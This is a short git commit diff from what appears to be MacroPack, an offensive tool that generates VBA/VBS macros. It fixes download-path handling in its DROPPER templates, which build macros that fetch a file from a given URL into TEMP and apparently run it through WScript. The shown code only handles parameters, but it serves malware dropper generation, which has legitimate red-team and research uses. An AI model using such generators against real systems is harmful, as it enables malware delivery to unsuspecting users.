be572a1181f9d9cd4b5b664821fbd4fe8f88dd06
sevagas <emeric.nasi@sevagas.com>
2018-09-22 11:47:43 +0200

    Correct pb in DROPPER template

--- src/modules/template_gen.py
+++ src/modules/template_gen.py
@@ -60,7 +60,7 @@ class TemplateToVba(MpModule):
 
         paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
         if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
-            paramDict[downloadPathKey] = 'Environ("TEMP") & "\\" & ' + paramDict[downloadPathKey]
+            paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
 
         # Add required functions
         self.addVBAModule(vbLib.WscriptExec.VBA)
@@ -78,15 +78,21 @@ class TemplateToVba(MpModule):
     def _processDropper2Template(self):
         """ Generate DROPPER2 template for VBA and VBS based """
         # Get required parameters
-        paramDict = OrderedDict([("target_url",None),("download_path",None)])      
+        downloadPathKey = "File name in TEMP or full file path."
+        paramDict = OrderedDict([("target_url",None),(downloadPathKey,None)])      
         self.fillInputParams(paramDict)
 
+
+        paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
+        if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
+            paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
+            
         # Add required functions
         self.addVBAModule(vbLib.WscriptExec.VBA)
 
         content = vbLib.templates.DROPPER2
         content = content.replace("<<<URL>>>", paramDict["target_url"])
-        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict["download_path"])
+        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict[downloadPathKey])
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
